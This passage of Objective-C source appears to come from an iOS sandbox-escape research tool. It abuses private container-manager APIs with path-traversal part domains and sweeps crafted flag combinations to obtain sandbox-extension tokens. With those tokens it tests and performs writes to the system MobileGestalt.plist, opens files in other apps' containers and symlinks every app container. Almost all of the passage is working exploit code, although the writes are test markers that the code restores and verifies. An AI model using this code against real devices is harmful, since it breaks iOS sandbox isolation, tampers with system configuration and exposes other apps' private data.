            [combo[@"Flags"] unsignedLongLongValue]];
        entry[@"Part"] = combo[@"Part"];
        entry[@"Traversal"] = combo[@"Traversal"];
        int64_t h = BadQueryConsumeCombo(gestaltPlist,
            @"systemgroup.com.apple.mobilegestaltcache",
            [combo[@"Flags"] unsignedLongLongValue],
            [combo[@"Part"] unsignedIntegerValue],
            [combo[@"Traversal"] boolValue]);
        entry[@"Handle"] = @(h);
        if (h < 0) {
            entry[@"Status"] = @"consume-failed";
            logStep(NO, @"gestalt sweep consume",
                [NSString stringWithFormat:@"flags=%@ part=%@ trav=%@ code=%lld",
                    entry[@"Flags"], combo[@"Part"], combo[@"Traversal"], h]);
            [sweepResults addObject:entry];
            continue;
        }
        errno = 0;
        BOOL writable = access(gestaltPlist.UTF8String, W_OK) == 0;
        entry[@"Writable"] = @(writable);
        entry[@"WErrno"] = @(writable ? 0 : errno);
        logStep(writable, @"gestalt sweep W_OK",
            [NSString stringWithFormat:@"flags=%@ part=%@ trav=%@ handle=%lld -> %@",
                entry[@"Flags"], combo[@"Part"], combo[@"Traversal"], h,
                writable ? @"WRITABLE!" : [NSString stringWithFormat:@"errno=%d", errno]]);
        if (writable && originalPlist) {
            NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:gestaltPlist];
            if ([plist isKindOfClass:NSDictionary.class]) {
                NSMutableDictionary *modified = [plist mutableCopy];
                modified[@"FuckFileWriteTest"] = @([[NSDate date] timeIntervalSince1970]);
                BOOL wrote = [modified writeToFile:gestaltPlist atomically:YES];
                entry[@"WriteBack"] = @(wrote);
                logStep(wrote, @"gestalt sweep write-back",
                    wrote ? @"marker written!" : @"write failed");
                NSDictionary *readBack = [NSDictionary dictionaryWithContentsOfFile:gestaltPlist];
                entry[@"MarkerReadBack"] = @([readBack[@"FuckFileWriteTest"] isKindOfClass:NSNumber.class]);
                BOOL restored = originalPlist ? [originalPlist writeToFile:gestaltPlist atomically:YES] : NO;
                entry[@"Restored"] = @(restored);
                NSData *after = [NSData dataWithContentsOfFile:gestaltPlist];
                BOOL shaOk = after.length && [sha256Hex(after) isEqualToString:sha256Hex(originalPlist)];
                entry[@"SHA256Match"] = @(shaOk);
                logStep(shaOk, @"gestalt sweep restore+verify",
                    shaOk ? @"original intact" : @"MISMATCH!");
            } else {
                entry[@"ParseError"] = @"plist unreadable";
            }
        }
        entry[@"Status"] = writable ? @"writable" : @"readonly";
        [sweepResults addObject:entry];
    }
    result[@"GestaltSweep"] = sweepResults;

    // 5) Class-12 geod pivot + 0x8100000000 (read-write flags) sweep against
    // the plist path. The geod system-data container is reachable on this
    // build (ACCESS MAP) and historically granted a 275-byte read-write
    // extension with a part-3 domain pivot to MobileGestalt Caches.
    NSArray<NSDictionary *> *pivotSweep = @[
        // class 12 geod pivots (FilzaSlop Issue B route)
        @{@"Class": @12, @"Identifier": @"com.apple.geod", @"GroupIdentifiers": @NO,
          @"Flags": @(0x900000000ULL), @"Part": @3, @"Traversal": @YES},
        @{@"Class": @12, @"Identifier": @"com.apple.geod", @"GroupIdentifiers": @NO,
          @"Flags": @(0x800000000ULL), @"Part": @3, @"Traversal": @YES},
        // class 13 read-write flags across parts/groups
        @{@"Class": @13, @"Identifier": @"systemgroup.com.apple.mobilegestaltcache",
          @"GroupIdentifiers": @YES, @"Flags": @(0x8100000000ULL), @"Part": @0, @"Traversal": @NO},
        @{@"Class": @13, @"Identifier": @"systemgroup.com.apple.mobilegestaltcache",
          @"GroupIdentifiers": @YES, @"Flags": @(0x8100000000ULL), @"Part": @3, @"Traversal": @NO},
        @{@"Class": @13, @"Identifier": @"systemgroup.com.apple.lsd.iconscache",
          @"GroupIdentifiers": @YES, @"Flags": @(0x8100000000ULL), @"Part": @3, @"Traversal": @NO},
        @{@"Class": @13, @"Identifier": @"systemgroup.com.apple.configurationprofiles",
          @"GroupIdentifiers": @YES, @"Flags": @(0x8100000000ULL), @"Part": @3, @"Traversal": @NO},
    ];
    NSMutableArray *pivotResults = [NSMutableArray array];
    for (NSDictionary *pivot in pivotSweep) {
        NSMutableDictionary *entry = [NSMutableDictionary dictionary];
        entry[@"Class"] = pivot[@"Class"];
        entry[@"Identifier"] = pivot[@"Identifier"];
        entry[@"Flags"] = [NSString stringWithFormat:@"0x%llx",
            [pivot[@"Flags"] unsignedLongLongValue]];
        entry[@"Part"] = pivot[@"Part"];
        entry[@"Traversal"] = pivot[@"Traversal"];
        int64_t h = BadQueryConsumeComboClass([pivot[@"Class"] unsignedIntegerValue],
            pivot[@"Identifier"], [pivot[@"GroupIdentifiers"] boolValue], gestaltPlist,
            [pivot[@"Flags"] unsignedLongLongValue],
            [pivot[@"Part"] unsignedIntegerValue],
            [pivot[@"Traversal"] boolValue]);
        entry[@"Handle"] = @(h);
        if (h < 0) {
            entry[@"Status"] = @"consume-failed";
            logStep(NO, @"pivot consume",
                [NSString stringWithFormat:@"class=%@ id=%@ flags=%@ part=%@ code=%lld",
                    pivot[@"Class"], pivot[@"Identifier"], entry[@"Flags"], pivot[@"Part"], h]);
            [pivotResults addObject:entry];
            continue;
        }
        errno = 0;
        BOOL writable = access(gestaltPlist.UTF8String, W_OK) == 0;
        entry[@"Writable"] = @(writable);
        entry[@"WErrno"] = @(writable ? 0 : errno);
        logStep(writable, @"pivot W_OK",
            [NSString stringWithFormat:@"class=%@ id=%@ flags=%@ part=%@ handle=%lld -> %@",
                pivot[@"Class"], pivot[@"Identifier"], entry[@"Flags"], pivot[@"Part"], h,
                writable ? @"WRITABLE!" : [NSString stringWithFormat:@"errno=%d", errno]]);
        if (writable && originalPlist) {
            NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:gestaltPlist];
            if ([plist isKindOfClass:NSDictionary.class]) {
                NSMutableDictionary *modified = [plist mutableCopy];
                modified[@"FuckFileWriteTest"] = @([[NSDate date] timeIntervalSince1970]);
                BOOL wrote = [modified writeToFile:gestaltPlist atomically:YES];
                entry[@"WriteBack"] = @(wrote);
                logStep(wrote, @"pivot write-back", wrote ? @"marker written!" : @"write failed");
                NSDictionary *readBack = [NSDictionary dictionaryWithContentsOfFile:gestaltPlist];
                entry[@"MarkerReadBack"] = @([readBack[@"FuckFileWriteTest"] isKindOfClass:NSNumber.class]);
                BOOL restored = originalPlist ? [originalPlist writeToFile:gestaltPlist atomically:YES] : NO;
                entry[@"Restored"] = @(restored);
                NSData *after = [NSData dataWithContentsOfFile:gestaltPlist];
                BOOL shaOk = after.length && [sha256Hex(after) isEqualToString:sha256Hex(originalPlist)];
                entry[@"SHA256Match"] = @(shaOk);
                logStep(shaOk, @"pivot restore+verify",
                    shaOk ? @"original intact" : @"MISMATCH!");
            }
        }
        entry[@"Status"] = writable ? @"writable" : @"readonly";
        [pivotResults addObject:entry];
    }
    result[@"PivotSweep"] = pivotResults;

    // 6) Token type inspection: print the raw sandbox-extension token class
    // (com.apple.app-sandbox.read vs read-write) for a writable container
    // path vs the read-only MobileGestalt path — direct proof of the
    // extension type the daemon issues for each.
    NSMutableArray *tokenTypes = [NSMutableArray array];
    NSArray<NSDictionary *> *tokenTargets = @[
        @{@"Name": @"MobileGestalt.plist (system group)",
          @"Path": gestaltPlist, @"Flags": @(0x900000000ULL),
          @"Part": @0, @"Traversal": @YES},
        @{@"Name": @"Own container (class 2 path)",
          @"Path": ownContainer, @"Flags": @(0x900000000ULL),
          @"Part": @0, @"Traversal": @YES},
    ];
    for (NSDictionary *t in tokenTargets) {
        NSMutableDictionary *entry = [NSMutableDictionary dictionary];
        entry[@"Name"] = t[@"Name"];
        NSString *token = badQueryToken(t[@"Path"],
            @"systemgroup.com.apple.mobilegestaltcache",
            [t[@"Flags"] unsignedLongLongValue],
            [t[@"Part"] unsignedIntegerValue],
            [t[@"Traversal"] boolValue]);
        if (!token) {
            entry[@"Status"] = @"no-token";
            logStep(NO, @"token fetch", t[@"Name"]);
        } else {
            // The token's 7th ';'-separated field is the extension class
            // (com.apple.app-sandbox.read vs read-write). Print it in full.
            NSArray<NSString *> *fields = [token componentsSeparatedByString:@";"];
            NSString *extensionClass = fields.count > 6 ? fields[6] : @"";
            entry[@"ExtensionClass"] = extensionClass;
            entry[@"TokenLength"] = @(token.length);
            entry[@"TokenPrefix"] = [token substringToIndex:MIN((NSUInteger)100, token.length)];
            entry[@"Status"] = @"token";
            logStep(YES, @"token fetch", [NSString stringWithFormat:@"%@ -> class=%@ (len=%lu)",
                t[@"Name"], extensionClass, (unsigned long)token.length]);
        }
        [tokenTypes addObject:entry];
    }
    result[@"TokenTypes"] = tokenTypes;

    // 7) Data Protection diagnosis: device lock state + file-level read test
    // on a REAL other-app container (not our own). Distinguishes:
    //   - readdir lists dirs but files are hidden       -> DP filter
    //   - readdir lists files but open() fails EPERM    -> DP locked (or MAC)
    //   - file opens and reads                          -> genuine access
    NSMutableDictionary *dpProbe = [NSMutableDictionary dictionary];
    BOOL protectedAvailable = [UIApplication sharedApplication].isProtectedDataAvailable;
    dpProbe[@"ProtectedDataAvailable"] = @(protectedAvailable);
    logStep(protectedAvailable, @"data protection",
        protectedAvailable ? @"protected data available (unlocked)" : @"LOCKED - files will be hidden");

    // Find a real other-app container via the escaped links.
    NSString *escapedAppData = [[probeRoot() stringByAppendingPathComponent:kBadQueryDirectoryName]
        stringByAppendingPathComponent:@"App Data"];
    NSString *otherContainer = nil;
    NSArray<NSString *> *links = [[NSFileManager defaultManager]
        contentsOfDirectoryAtPath:escapedAppData error:nil];
    for (NSString *name in links ?: @[]) {
        NSString *linkPath = [escapedAppData stringByAppendingPathComponent:name];
        struct stat st = {0};
        if (lstat(linkPath.fileSystemRepresentation, &st) != 0 || !S_ISLNK(st.st_mode)) continue;
        char target[PATH_MAX] = {0};
        ssize_t n = readlink(linkPath.fileSystemRepresentation, target, sizeof(target) - 1);
        if (n > 0) {
            target[n] = '\0';
            otherContainer = [NSString stringWithUTF8String:target];
            dpProbe[@"Container"] = otherContainer;
            break;
        }
    }
    if (!otherContainer) {
        // Fallback: the MobileGestalt cache dir (system group, known reachable).
        otherContainer = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
        dpProbe[@"Container"] = otherContainer;
        dpProbe[@"Fallback"] = @YES;
    }
    if (otherContainer) {
        int64_t h = BadQueryConsumeCombo(otherContainer,
            @"systemgroup.com.apple.mobilegestaltcache", 0x900000000ULL, 0, YES);
        dpProbe[@"Handle"] = @(h);
        if (h >= 0) {
            DIR *dir = opendir(otherContainer.UTF8String);
            if (dir) {
                dpProbe[@"Readdir"] = @YES;
                NSString *firstFile = nil;
                NSUInteger scanned = 0;
                struct dirent *de;
                while ((de = readdir(dir)) != NULL && scanned < 200) {
                    if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")) continue;
                    scanned++;
                    NSString *child = [otherContainer stringByAppendingPathComponent:
                        [NSString stringWithUTF8String:de->d_name]];
                    struct stat cs = {0};
                    if (lstat(child.fileSystemRepresentation, &cs) == 0 && S_ISREG(cs.st_mode)) {
                        firstFile = child;
                        break;
                    }
                }
                closedir(dir);
                dpProbe[@"EntriesScanned"] = @(scanned);
                if (firstFile) {
                    dpProbe[@"FirstFile"] = firstFile;
                    errno = 0;
                    int fd = open(firstFile.UTF8String, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
                    dpProbe[@"OpenOK"] = @(fd >= 0);
                    dpProbe[@"OpenErrno"] = @(fd >= 0 ? 0 : errno);
                    logStep(fd >= 0, @"other-container file open",
                        fd >= 0 ? firstFile : [NSString stringWithFormat:@"%@ errno=%d (%s)",
                            firstFile, errno, strerror(errno)]);
                    if (fd >= 0) {
                        uint8_t byte = 0;
                        ssize_t r = read(fd, &byte, 1);
                        dpProbe[@"ReadOK"] = @(r == 1);
                        logStep(r == 1, @"other-container file read", r == 1 ? @"read byte" : @"read failed");
                        close(fd);
                    }
                } else {
                    dpProbe[@"NoRegularFiles"] = @YES;
                    logStep(NO, @"other-container files",
                        scanned > 0 ? @"readdir lists dirs but NO regular files (DP filter?)"
                                    : @"readdir returned nothing");
                }
            } else {
                dpProbe[@"Readdir"] = @NO;
                dpProbe[@"ReaddirErrno"] = @(errno);
                logStep(NO, @"other-container opendir", [NSString stringWithFormat:@"errno=%d", errno]);
            }
        }
    }
    result[@"DataProtectionProbe"] = dpProbe;

    // 8) mond/cmg variant (rooootdev/mond cmg.swift): the parameter combo
    // that grants write access to MobileGestalt.plist on iOS 27.0 beta —
    // platform=2, transient=false, flags=(1<<32)|(1<<39), part 3, using
    // container_object_get_sandbox_token + activate(res, true), then a
    // direct O_WRONLY open. Try it plus flag/platform/part variants on 26.6.
    result[@"CmgProbe"] = runCmgProbe();

    logLine(@"==== write capability probe done ====");
    return result;
}

// ---- mond/cmg variant -----------------------------------------------------
static NSMutableDictionary *runCmgProbe(void)
{
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    logLine(@"==== cmg probe (mond variant) ====");

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"dlopen";
        return result;
    }
    void *(*query_create)(void) = dlsym(mgr, "container_query_create");
    void (*query_set_class)(void *, uint64_t) = dlsym(mgr, "container_query_set_class");
    void (*query_set_transient)(void *, BOOL) = dlsym(mgr, "container_query_set_transient");
    void (*query_set_group_identifiers)(void *, xpc_object_t) = dlsym(mgr, "container_query_set_group_identifiers");
    void (*query_set_platform)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_platform");
    void (*query_set_flags)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_flags");
    void (*query_set_part)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_part");
    void *(*query_get_single_result)(void *) = dlsym(mgr, "container_query_get_single_result");
    void (*query_free)(void *) = dlsym(mgr, "container_query_free");
    char *(*object_get_sandbox_token)(void *) = dlsym(mgr, "container_object_get_sandbox_token");
    BOOL (*object_activate)(void *, BOOL) = (BOOL (*)(void *, BOOL))dlsym(mgr, "container_object_sandbox_extension_activate");
    void *(*object_copy)(void *) = dlsym(mgr, "container_object_copy");
    void (*object_free)(void *) = dlsym(mgr, "container_object_free");
    char *(*copy_sandbox_token)(void *) = dlsym(mgr, "container_copy_sandbox_token");
    int64_t (*consume_extension)(const char *) =
        (int64_t (*)(const char *))dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    const char *(*object_get_path)(void *) = dlsym(mgr, "container_object_get_path");
    if (!query_create || !query_set_class || !query_set_transient ||
        !query_set_group_identifiers || !query_set_platform || !query_set_flags ||
        !query_set_part || !query_get_single_result || !query_free ||
        !object_get_sandbox_token || !object_copy || !copy_sandbox_token ||
        !consume_extension || !object_free || !object_get_path) {
        dlclose(mgr);
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"dlsym";
        logStep(NO, @"cmg dlsym", @"one or more symbols missing");
        return result;
    }
    logStep(YES, @"cmg dlsym", @"all symbols resolved (incl. set_transient/set_platform/get_sandbox_token)");

    NSArray<NSDictionary *> *variants = @[
        @{@"Name": @"cmg exact (platform=2 flags=0x8000000100 part=3)",
          @"Flags": @(0x8000000100ULL), @"Platform": @2, @"Part": @3},
        @{@"Name": @"platform=2 flags=0x900000000 part=3",
          @"Flags": @(0x900000000ULL), @"Platform": @2, @"Part": @3},
        @{@"Name": @"platform=2 flags=0x800000000 part=3",
          @"Flags": @(0x800000000ULL), @"Platform": @2, @"Part": @3},
        @{@"Name": @"platform=2 flags=0x8000000100 part=0",
          @"Flags": @(0x8000000100ULL), @"Platform": @2, @"Part": @0},
        @{@"Name": @"platform=0 flags=0x8000000100 part=3",
          @"Flags": @(0x8000000100ULL), @"Platform": @0, @"Part": @3},
        @{@"Name": @"platform=1 flags=0x8000000100 part=3",
          @"Flags": @(0x8000000100ULL), @"Platform": @1, @"Part": @3},
        @{@"Name": @"platform=2 flags=0x8000000100 part=3 no-transient-set",
          @"Flags": @(0x8000000100ULL), @"Platform": @2, @"Part": @3, @"NoTransient": @YES},
    ];

    NSMutableArray *results = [NSMutableArray array];
    for (NSDictionary *variant in variants) {
        NSMutableDictionary *entry = [NSMutableDictionary dictionary];
        entry[@"Name"] = variant[@"Name"];
        void *query = query_create();
        if (!query) {
            entry[@"Status"] = @"query-failed";
            [results addObject:entry];
            continue;
        }
        query_set_class(query, 13);
        if (![variant[@"NoTransient"] boolValue]) query_set_transient(query, false);
        xpc_object_t xid = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
        query_set_group_identifiers(query, xid);
        query_set_platform(query, [variant[@"Platform"] unsignedLongLongValue]);
        query_set_flags(query, [variant[@"Flags"] unsignedLongLongValue]);
        query_set_part(query, [variant[@"Part"] unsignedLongLongValue]);
        void *res = query_get_single_result(query);
        if (!res) {
#if !OS_OBJECT_USE_OBJC
            xpc_release(xid);
#endif
            query_free(query);
            entry[@"Status"] = @"denied";
            logStep(NO, @"cmg query", [NSString stringWithFormat:@"%@ -> NULL", variant[@"Name"]]);
            [results addObject:entry];
            continue;
        }
        char *token = object_get_sandbox_token(res);
        // NOTE: unlike container_copy_sandbox_token, this returns a pointer
        // INTO the container object — it must NOT be freed (mond does not
        // free it either). Copy the string before the object is released.
        if (token) {
            char *dup = strdup(token);
            entry[@"Token"] = dup ? [NSString stringWithUTF8String:dup] : nil;
            if (dup) free(dup);
        }
        // container_object_sandbox_extension_activate(res, true) CRASHES on
        // iOS 26.6 (os_map_str_find on NULL) — it expects an object copied
        // via container_object_copy. Use the proven MCM chain instead:
        // copy -> copy_sandbox_token -> sandbox_extension_consume. The
        // mond query parameters (platform/transient/flags/part) are what
        // matter; the activation style is interchangeable.
        void *activation = object_copy(res);
        BOOL activated = NO;
        if (activation) {
            char *copyToken = copy_sandbox_token(activation);
            if (copyToken) {
                int64_t handle = consume_extension(copyToken);
                free(copyToken);
                activated = handle >= 0;
                entry[@"Handle"] = @(handle);
            }
            object_free(activation);
        }
        entry[@"Activated"] = @(activated);
        logStep(activated, @"cmg activate",
            [NSString stringWithFormat:@"%@ -> %@", variant[@"Name"], activated ? @"YES" : @"NO"]);
        if (activated) {
            const char *c_path = object_get_path(res);
            if (!c_path) {
                entry[@"Status"] = @"no-path";
                logStep(NO, @"cmg get_path", @"returned NULL");
            } else {
                NSString *plist = [[NSString stringWithUTF8String:c_path]
                    stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
                errno = 0;
                int fd = open(plist.UTF8String, O_WRONLY | O_CLOEXEC | O_NOFOLLOW);
                entry[@"OpenWrite"] = @(fd >= 0);
                entry[@"OpenErrno"] = @(fd >= 0 ? 0 : errno);
                int accmode = -1;
                if (fd >= 0) {
                    accmode = fcntl(fd, F_GETFL) & O_ACCMODE;
                    close(fd);
                }
                entry[@"AccMode"] = @(accmode);
                entry[@"Path"] = plist;
                logStep(fd >= 0, @"cmg O_WRONLY open",
                    fd >= 0 ? [NSString stringWithFormat:@"WRITABLE! %@", plist]
                            : [NSString stringWithFormat:@"errno=%d", errno]);
                if (fd >= 0) {
                    // Write a marker and restore, proving write capability.
                    NSData *original = [NSData dataWithContentsOfFile:plist];
                    NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:plist];
                    if (original && [dict isKindOfClass:NSDictionary.class]) {
                        NSMutableDictionary *modified = [dict mutableCopy];
                        modified[@"FuckFileCmgWriteTest"] = @([[NSDate date] timeIntervalSince1970]);
                        BOOL wrote = [modified writeToFile:plist atomically:YES];
                        entry[@"WriteBack"] = @(wrote);
                        logStep(wrote, @"cmg write-back", wrote ? @"MARKER WRITTEN!" : @"failed");
                        NSDictionary *readBack = [NSDictionary dictionaryWithContentsOfFile:plist];
                        entry[@"MarkerReadBack"] = @([readBack[@"FuckFileCmgWriteTest"] isKindOfClass:NSNumber.class]);
                        BOOL restored = original ? [original writeToFile:plist atomically:YES] : NO;
                        entry[@"Restored"] = @(restored);
                        NSData *after = [NSData dataWithContentsOfFile:plist];
                        entry[@"SHA256Match"] = @(after.length && [sha256Hex(after) isEqualToString:sha256Hex(original)]);
                        BOOL restoredOk = restored && [entry[@"SHA256Match"] boolValue];
                        logStep(restoredOk, @"cmg restore+verify",
                            restoredOk ? @"original intact" : @"MISMATCH!");
                    }
                }
            }
        }
        entry[@"Status"] = [entry[@"OpenWrite"] boolValue] ? @"writable" : @"readonly-or-denied";
        object_free(res);
#if !OS_OBJECT_USE_OBJC
        xpc_release(xid);
#endif
        query_free(query);
        [results addObject:entry];
    }
    dlclose(mgr);
    result[@"Variants"] = results;
    logLine(@"==== cmg probe done ====");
    return result;
}

// Fetches the raw sandbox extension token for a combo (no consume), for
// inspection of the extension class string. Caller frees nothing; returns an
// autoreleased copy (malloc'd C string duplicated into NSString).
static NSString *badQueryToken(NSString *targetPath, NSString *group,
                               uint64_t flags, uint64_t part, BOOL traversal)
{
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return nil;
    void *(*query_create)(void) = dlsym(mgr, "container_query_create");
    void (*query_set_class)(void *, uint64_t) = dlsym(mgr, "container_query_set_class");
    void (*query_set_group_identifiers)(void *, xpc_object_t) = dlsym(mgr, "container_query_set_group_identifiers");
    void (*query_set_flags)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_flags");
    void (*query_set_part)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_part");
    void (*query_set_part_domain)(void *, const char *) = dlsym(mgr, "container_query_operation_set_part_domain");
    void *(*query_get_single_result)(void *) = dlsym(mgr, "container_query_get_single_result");
    void (*query_free)(void *) = dlsym(mgr, "container_query_free");
    char *(*copy_sandbox_token)(void *) = dlsym(mgr, "container_copy_sandbox_token");
    if (!query_create || !query_set_class || !query_set_group_identifiers ||
        !query_set_flags || !query_set_part || !query_set_part_domain ||
        !query_get_single_result || !query_free || !copy_sandbox_token) {
        dlclose(mgr);
        return nil;
    }
    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return nil;
    }
    query_set_class(query, 13);
    xpc_object_t xid = xpc_string_create(group.UTF8String);
    query_set_group_identifiers(query, xid);
    query_set_part(query, part);
    if (traversal) {
        NSString *traversalPath =
            [NSString stringWithFormat:@"../../../../../../../..%@", targetPath];
        query_set_part_domain(query, traversalPath.UTF8String);
    }
    query_set_flags(query, flags);
    void *queryResult = query_get_single_result(query);
    if (!queryResult) {
#if !OS_OBJECT_USE_OBJC
        xpc_release(xid);
#endif
        query_free(query);
        dlclose(mgr);
        return nil;
    }
    char *token = copy_sandbox_token(queryResult);
#if !OS_OBJECT_USE_OBJC
    xpc_release(xid);
#endif
    query_free(query);
    dlclose(mgr);
    if (!token) return nil;
    NSString *result = [NSString stringWithUTF8String:token];
    free(token);
    return result;
}

int64_t BadQueryConsumePath(NSString *path, NSString *groupIdentifier,
                            BOOL isGroup, NSString **error)
{
    if (!path.length || ![path hasPrefix:@"/"]) {
        if (error) *error = @"path must be absolute";
        return -255;
    }
    char *pathBuffer = strdup(path.UTF8String);
    char *groupBuffer = groupIdentifier.length ? strdup(groupIdentifier.UTF8String) : NULL;
    if (!pathBuffer || (groupIdentifier.length && !groupBuffer)) {
        free(pathBuffer);
        free(groupBuffer);
        if (error) *error = @"out of memory";
        return -255;
    }
    int64_t handle = bad_query(pathBuffer, false, groupBuffer, isGroup);
    free(pathBuffer);
    free(groupBuffer);
    if (handle >= 0) {
        FFLogTag(@"BadQueryProbe", @"consume OK canonical path=%@ handle=%lld",
            path, handle);
        return handle;
    }

    // iOS 26.6 fallback: the canonical flags issue no token, but the variant
    // matrix proves class-13 combos still do. Try target-traversal combos
    // first so the handle actually covers the requested path.
    NSUInteger tried = 0;
    if (!groupIdentifier && !isGroup) {
        static NSArray<NSDictionary *> *combos;
        static dispatch_once_t onceToken;
        dispatch_once(&onceToken, ^{
            NSArray<NSString *> *groups = @[
                @"systemgroup.com.apple.mobilegestaltcache",
                @"systemgroup.com.apple.lsd.iconscache",
                @"systemgroup.com.apple.configurationprofiles",
                @"systemgroup.com.apple.installcoordinationd",
            ];
            NSArray<NSNumber *> *flags = @[
                @(0x900000000ULL),
                @(0x800000000ULL),
                @(0x8100000000ULL),
                @(0x080000000ULL),
            ];
            NSArray<NSNumber *> *parts = @[@0, @3];
            NSMutableArray *all = [NSMutableArray array];
            for (NSString *group in groups)
                for (NSNumber *flag in flags)
                    for (NSNumber *part in parts)
                        for (NSNumber *traversal in @[@YES, @NO])
                            [all addObject:@{@"Group": group, @"Flags": flag,
                                             @"Part": part, @"Traversal": traversal}];
            combos = all;
        });
        for (NSDictionary *combo in combos) {
            tried++;
            int64_t matrixHandle = BadQueryConsumeCombo(path, combo[@"Group"],
                [combo[@"Flags"] unsignedLongLongValue],
                [combo[@"Part"] unsignedLongLongValue],
                [combo[@"Traversal"] boolValue]);
            if (matrixHandle >= 0) {
                FFLogTag(@"BadQueryProbe",
                    @"consume OK matrix path=%@ group=%@ flags=0x%llx part=%@ traversal=%@ handle=%lld",
                    path, combo[@"Group"],
                    [combo[@"Flags"] unsignedLongLongValue],
                    combo[@"Part"], combo[@"Traversal"], matrixHandle);
                return matrixHandle;
            }
            FFLogTag(@"BadQueryProbe",
                @"consume FAIL matrix path=%@ group=%@ flags=0x%llx part=%@ traversal=%@ code=%lld",
                path, combo[@"Group"],
                [combo[@"Flags"] unsignedLongLongValue],
                combo[@"Part"], combo[@"Traversal"], matrixHandle);
        }
    }
    if (error)
        *error = [NSString stringWithFormat:
            @"bad_query failed (code=%lld: %@) and all %lu matrix combos also failed",
            handle, BadQueryCodeText(handle), (unsigned long)tried];
    return handle;
}

void BadQueryReleaseHandle(int64_t handle)
{
    bad_query_release(handle);
}

#pragma mark - Container enumeration (UUID -> bundle ID)

static NSString *BadQueryEscapedRoot(void)
{
    return [probeRoot() stringByAppendingPathComponent:kBadQueryDirectoryName];
}

static BOOL BadQuerySafeLinkName(NSString *name)
{
    if (name.length == 0 || name.length > 255) return NO;
    NSCharacterSet *allowed = [NSCharacterSet characterSetWithCharactersInString:
        @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_"];
    return [name rangeOfCharacterFromSet:allowed.invertedSet].location == NSNotFound &&
        ![name isEqualToString:@"."] && ![name isEqualToString:@".."];
}

static NSDictionary *BadQueryEnumerateRoot(NSString *title, NSString *rootPath,
                                           NSString *folderName, BOOL useGroupRoute)
{
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    result[@"Name"] = title;
    result[@"Root"] = rootPath;
    NSString *error = nil;
    int64_t handle = BadQueryConsumePath(rootPath,
        useGroupRoute ? sacrificeGroupId() : nil, useGroupRoute, &error);
    if (handle < 0) {
        result[@"Status"] = @"failed";
        result[@"Error"] = error ?: [NSString stringWithFormat:@"consume failed (%lld)", handle];
        logStep(NO, [NSString stringWithFormat:@"enumerate %@", title],
            result[@"Error"]);
        return result;
    }
    result[@"Handle"] = @(handle);

    char *pathCopy = strdup(rootPath.UTF8String);
    char *list = pathCopy ? bad_query_list(pathCopy, 5000000) : NULL;
    free(pathCopy);
    if (!list) {
        result[@"Status"] = @"failed";
        result[@"Error"] = @"bad_query_list returned NULL (fsgetpath denied)";
        logStep(NO, [NSString stringWithFormat:@"enumerate %@", title], result[@"Error"]);
        return result;
    }

    NSString *folder = [BadQueryEscapedRoot() stringByAppendingPathComponent:folderName];
    [[NSFileManager defaultManager] createDirectoryAtPath:folder
        withIntermediateDirectories:YES attributes:@{NSFilePosixPermissions: @0700} error:nil];
    NSMutableArray<NSDictionary *> *entries = [NSMutableArray array];
    NSArray<NSString *> *lines = [[NSString stringWithUTF8String:list]
        componentsSeparatedByString:@"\n"];
    for (NSString *line in lines) {
        if (!line.length) continue;
        NSString *child = line;
        NSString *uuid = child.lastPathComponent;
        if (uuid.length == 0 || [uuid hasPrefix:@"."]) continue;

        NSString *identifier = uuid;
        NSString *metadataPath = [child stringByAppendingPathComponent:
            @".com.apple.mobile_container_manager.metadata.plist"];
        NSDictionary *metadata = [NSDictionary dictionaryWithContentsOfFile:metadataPath];
        NSString *meta = [metadata[@"MCMMetadataIdentifier"]
            isKindOfClass:NSString.class] ? metadata[@"MCMMetadataIdentifier"] : nil;
        if (BadQuerySafeLinkName(meta)) identifier = meta;

        // Always keep the UUID link for traceability; use the bundle ID as the
        // human-friendly primary link when it is available and unique.
        NSString *uuidLink = [folder stringByAppendingPathComponent:uuid];
        struct stat status = {0};
        if (lstat(uuidLink.fileSystemRepresentation, &status) == 0 && S_ISLNK(status.st_mode))
            unlink(uuidLink.fileSystemRepresentation);
        if (symlink(child.fileSystemRepresentation, uuidLink.fileSystemRepresentation) == 0)
            [entries addObject:@{@"UUID": uuid, @"Identifier": identifier, @"Path": child}];

        if (![identifier isEqualToString:uuid]) {
            NSString *nameLink = [folder stringByAppendingPathComponent:identifier];
            if (lstat(nameLink.fileSystemRepresentation, &status) == 0 && S_ISLNK(status.st_mode))
                unlink(nameLink.fileSystemRepresentation);
            symlink(child.fileSystemRepresentation, nameLink.fileSystemRepresentation);
        }
    }
    free(list);

    result[@"Status"] = @"done";
    result[@"Count"] = @(entries.count);
    result[@"Entries"] = entries;
    NSString *indexPath = [folder stringByAppendingPathComponent:@"INDEX.plist"];
    [entries writeToFile:indexPath atomically:YES];
    logStep(YES, [NSString stringWithFormat:@"enumerate %@", title],
        [NSString stringWithFormat:@"%lu containers -> %@", (unsigned long)entries.count, folder]);
    return result;
}

NSDictionary *BadQueryEnumerateAllContainers(void)
{
    NSMutableArray<NSDictionary *> *results = [NSMutableArray array];
    BOOL sacrifice = sacrificeGroupId().length > 0;
    [results addObject:BadQueryEnumerateRoot(@"App Data",
